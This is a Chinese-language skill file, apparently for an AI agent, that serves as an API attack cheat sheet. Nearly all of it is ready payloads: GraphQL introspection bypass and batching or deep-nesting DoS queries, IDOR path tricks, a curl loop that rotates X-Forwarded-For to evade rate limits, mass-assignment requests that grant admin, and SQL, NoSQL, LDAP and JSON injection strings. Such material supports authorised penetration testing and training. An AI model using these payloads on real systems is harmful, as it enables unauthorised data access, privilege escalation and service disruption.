---
name: api-api-detail
description: Use when encountering rest api、graphql、grpc安全攻击技术
---

# API安全攻击

## Info

- **Domain**: web
- **Tags**: web, api, rest, graphql

## GraphQL攻击

### 攻击思路
```
内省查询获取Schema → 枚举敏感字段/Mutation → 构造恶意查询 → 提取数据/DoS
```

### 内省查询
```graphql
query IntrospectionQuery {
  __schema {
    types { name kind fields { name args { name type { name } } } }
    queryType { name }
    mutationType { name }
  }
}
```

### 内省绕过
```graphql
# 方式1：片段绕过
{ ...IntrospectionQuery }

# 方式2：字段别名
query { __schema { __typename } }

# 方式3：编码
{"query":"{__schema{types{name}}}","operationName":"IntrospectionQuery"}
```

### 批量查询DoS
```graphql
# 单请求100次查询绕过限频
query {
  u1: user(id:1) { name email }
  u2: user(id:2) { name email }
  ...
  u100: user(id:100) { name email }
}
```

### 深度嵌套DoS
```graphql
query DeepNesting {
  user { posts { comments { author { posts { comments { ... } } } } }
}
```

### 字段枚举
```graphql
# 枚举隐藏字段
query { __type(name:"User") { fields { name type { name } } } }
```

## REST API攻击

### IDOR越权矩阵

| 类型 | 攻击方式 |
|------|----------|
| 水平越权 | /api/users/1 → /api/users/2 |
| 垂直越权 | user角色 → admin接口 |
| 批量越权 | ids[]=1,2,3,4,5 |
| GUID越权 | 预测/枚举UUID |

### IDOR绕过
```
# 数字变体
/api/users/1 → /api/users/001 → /api/users/1.0

# 编码绕过
/api/users/1 → /api/users/%31 → /api/users/0x31

# 参数污染
/api/users?id=1&id=2 → 返回id=2

# JSON数组
POST {"id":[1,2,3,4,5]}
```

### 速率限制绕过

| 方法 | 技术 |
|------|------|
| IP轮换 | X-Forwarded-For轮换 |
| Header污染 | X-Real-IP/Client-IP等 |
| 分布式 | 多IP并发请求 |
| 用户代理 | UA轮换 |

```bash
# IP轮换
for i in $(seq 1 100); do
  curl -H "X-Forwarded-For: 10.0.0.$i" http://target/api/test
done
```

### 批量赋值(Mass Assignment)
```json
# 探测隐藏字段
POST /api/users {"name":"test"}
响应: {"id":1,"name":"test","role":"user","isAdmin":false}

# 尝试注入
POST /api/users {"name":"test","role":"admin","isAdmin":true}
PUT /api/users/1 {"role":"admin"}
```

## API注入攻击

| 注入类型 | Payload示例 |
|----------|-------------|
| SQL | /api/users?name=admin'-- |
| NoSQL | /api/users?name[$ne]=null |
| LDAP | /api/users?name=*)(uid=*))(|(uid=* |
| JSON | {"name":"admin\",\"role\":\"admin"} |

### NoSQL注入
```javascript
// MongoDB注入
?name[$ne]=admin
?name[$regex]=^admin
?age[$gt]=0&age[$lt]=100
{"name":{"$ne":"admin"},"password":{"$ne":""}}
```

## 工具链

| 工具 | 用途 |
|------|------|
| gqlscan | GraphQL安全扫描 |
| inql | GraphQL内省分析 |
| graphql-cop | GraphQL漏洞检测 |
| RESTler | REST API模糊测试 |
| Postman | API测试平台 |